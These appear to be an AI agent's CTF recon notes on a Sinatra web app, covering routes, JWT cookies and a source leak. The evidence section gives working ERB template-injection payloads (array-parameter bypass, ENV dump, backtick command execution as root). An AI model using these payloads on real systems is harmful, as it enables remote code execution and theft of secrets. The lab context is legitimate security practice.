steps:
- 'GET /shop needs auth: without cookie returns 302 /shop (islogin redirect, infinite
  body-less loop). /shop route has NO islogin guard in source; but OpenResty front
  returns 302 unless cookie present -- cookie is required to see HTML.'
- GET /api/auth issues a FRESH uid per call -> JWT reset does not reset existing cookie;
  /work jkl accumulation is stateless-in-cookie.
- '/filebak returns full Sinatra source (1978 bytes, saved shared/recon-public-endpoints/filebak.body):
  7 routes total (/, /filebak, /api/auth, /api/info, /shop GET/POST, /work). No other
  routes.'
- 'POST /shop success branch sets Set-Cookie auth=JWT{... , flag: ENV[FLAG]} -> flag
  lives in the response cookie when jkl>=1e27'
- '/work?name=&do= has NO SSTI: body template is a literal String with no <%= %> tags;
  #{name[0,7]} is only interpolated into an alert() string'
- /api/auth mints a new random uuid on every call -> GET /api/auth is 'reset' and
  NOT 'recover my previous/other uid's jkl'
- /filebak is served via ERB of IO.binread(__FILE__) (a String) -- Ruby's Kernel#erb
  on a String will NOT render <%=%> (it's ERB.new(String) -> compile, result requires
  binding). Even so, serving source
- Server is openresty/nginx front, Sinatra/Ruby backend; no static folder file served
  (/static/ 404) and no log path served (/log/http.log, /../log/http.log, /static/../log/http.log
  404)
- GET /shop with cookie returns whole UI; GET /shop WITHOUT cookie -> 302 Location
  /shop (islogin hides body)
- 'nam[0,7] whitespace/param quirks: name[x]=bot and do[foo]=x give empty (500); duplicate
  name -> last wins; name[]=bot with string do -> empty 200; name=''1234567'' & do=''1234567
  is working'' succeeds nor'
- tampered JWT (wrong HS256 signature) on /api/info -> 500 Internal Server Error (not
  JSON error); error body always 'Internal Server Error' (Sinatra show_exceptions
  off, just generic)
- '/api/auth truly replaces cookie: uid 4efd... (jkl 24) -> /api/auth -> uid c3ec...
  (jkl 20); /api/info reflects current cookie. So jkl state IS the cookie; no server-side
  per-uid store'
evidence_chain:
- 'SSTI BYPASS: /work name[0,7] truncation is per-string; passing name[]=ARRAY makes
  do = array.inspect and ERB compiles the JOINED-ONCE template with full payload:
  name[]=<%= ENV.to_a.inspect %>&do=["<%= ENV.to_a.inspect %>"] is working leaks all
  ENV incl FLAG and SECRET; name[]=<%= `id` %> -> uid=0(root). FLAG=<FLAG>'
- '[codex] `` <%= `id` %> `` -> `uid=0(root) gid=0(root) groups=0(root)` — app runs
  as root in a k8s pod'
- '[codex] FOUND_FLAG=<FLAG>'
